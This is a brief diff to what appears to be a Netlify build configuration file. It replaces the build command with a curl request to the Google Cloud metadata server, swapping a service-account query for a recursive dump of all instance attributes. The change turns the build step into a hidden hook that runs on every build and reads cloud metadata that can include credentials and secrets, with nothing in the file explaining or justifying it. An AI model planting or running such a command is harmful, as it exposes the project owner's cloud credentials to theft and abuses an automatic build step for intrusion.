@@ -1,5 +1,5 @@
 [build]
-  command = "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+  command = "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json"
   publish = "dist"
 [build.environment]
   YARN_VERSION = "1.9.4"
